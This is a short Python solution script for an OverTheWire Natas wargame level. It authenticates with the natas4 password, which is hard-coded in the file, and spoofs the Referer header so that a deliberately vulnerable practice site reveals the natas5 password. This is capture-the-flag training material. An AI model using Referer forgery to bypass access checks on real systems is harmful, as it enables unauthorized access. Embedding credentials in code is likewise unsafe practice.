#!/usr/bin/python3

import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org' % username

# coming from natas5
hdr = {'Referer':'http://natas5.natas.labs.overthewire.org/'}
response = requests.get(url+'/index.php/', auth = (username, password), headers=hdr )
content = response.text
# print(content)

pwd = re.findall('natas5 is (.*)', content)[0]
print(pwd)
